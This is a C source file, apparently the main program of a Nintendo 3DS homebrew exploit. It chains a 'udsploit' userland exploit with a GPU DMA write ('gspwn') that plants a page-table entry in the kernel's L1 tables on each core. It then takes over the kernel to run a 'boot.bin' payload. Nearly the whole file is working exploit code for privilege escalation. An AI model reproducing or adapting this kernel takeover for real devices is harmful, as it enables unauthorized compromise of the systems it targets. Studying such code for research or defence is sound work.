#include <stdarg.h>
#include <stdio.h>
#include <string.h>

#include <3ds.h>

#include "../kernelhaxcode_3ds/takeover.h"
#include "kernelhaxcode_3ds_bin.h"

Result udsploit(void);
void print(char *msg, ...);

PrintConsole topScreenConsole;

static inline void gspwn(u32 outPa, u32 inPa, u32 size)
{
	gspSetTextureCopyPhys(outPa, inPa, size, 0, 0, 8);
}

static inline void __flush_prefetch_buffer(void)
{
    // Similar to isb in newer Arm architecture versions
    __asm__ __volatile__ ("mcr p15, 0, %0, c7, c5, 4" :: "r" (0) : "memory");
}

static void mapL2TableViaGpuDma(const BlobLayout *layout, void *workBuffer)
{
	static const u32 s_l1tables[] = { 0x1FFF8000, 0x1FFFC000, 0x1F3F8000, 0x1F3FC000 };
	u32 numCores = IS_N3DS ? 4 : 2;

	// Minimum size of GPU DMA is 16, so we need to pad a bit...
	u32 l1EntryData[4] = { osConvertVirtToPhys(layout->l2table) | 1 };
	memcpy(workBuffer, l1EntryData, 16);

	// Ignore result
	GSPGPU_FlushDataCache(workBuffer, 16);

	u32 l1EntryPa = osConvertVirtToPhys(workBuffer);

	for (u32 i = 0; i < numCores; i++) {
		u32 dstPa = s_l1tables[i] + (KHC3DS_MAP_ADDR >> 20) * 4;
		gspwn(dstPa, l1EntryPa, 16);
	}

	// No need to clean&invalidate here:
	// https://developer.arm.com/docs/ddi0360/e/memory-management-unit/hardware-page-table-translation
	// "MPCore hardware page table walks do not cause a read from the level one Unified/Data Cache"

	__flush_prefetch_buffer();
}

static Result takeOverKernelAndBeyond(const char *payloadFileName, size_t payloadFileOffset)
{
    BlobLayout *layout = (BlobLayout *)linearMemAlign(sizeof(BlobLayout), 0x1000);
    if (layout == NULL)
        return -1;

    memset(layout, 0, sizeof(BlobLayout));
    memcpy(layout->code, kernelhaxcode_3ds_bin, kernelhaxcode_3ds_bin_size);
    khc3dsPrepareL2Table(layout);
    // Ensure everything (esp. the layout) is written back into the main memory
    GSPGPU_FlushDataCache((const void *)0x14000000, 0x700000);
    __flush_prefetch_buffer();

    mapL2TableViaGpuDma(layout, layout->smallWorkBuffer);

    khc3dsLcdDebug(true, 128, 64, 0); // brown
    return khc3dsTakeover(payloadFileName, payloadFileOffset);
}

int main(void)
{
    Result ret = 0;

    gfxInitDefault();
    consoleInit(GFX_TOP, &topScreenConsole);
    consoleClear();

    ret = udsploit();
    if (R_SUCCEEDED(ret)) {
        ret = takeOverKernelAndBeyond("boot.bin", 0);
        print("Taking over kernel: 0x%08lX", ret);
    } else {
        print("Failed");
    }

    if (R_SUCCEEDED(ret)) {
        print("Done.");
    } else if (R_SUMMARY(ret) == RES_USER_CANCELED) {
        printf("Canceled.\n");
    }

    print("Exit: START");

    while (aptMainLoop()) {
        hidScanInput();
        if (hidKeysDown() & KEY_START) {
            break;
        }
    }

    consoleClear();
    gfxExit();
    return 0;
}

static u8 y = 0;

void print(char *msg, ...)
{
    va_list args;
    char s[100] = {0};

    va_start(args, msg);
    vsnprintf(s, sizeof(s), msg, args);
    va_end(args);

    printf("\x1b[%u;1H %s", ++y, s);
}
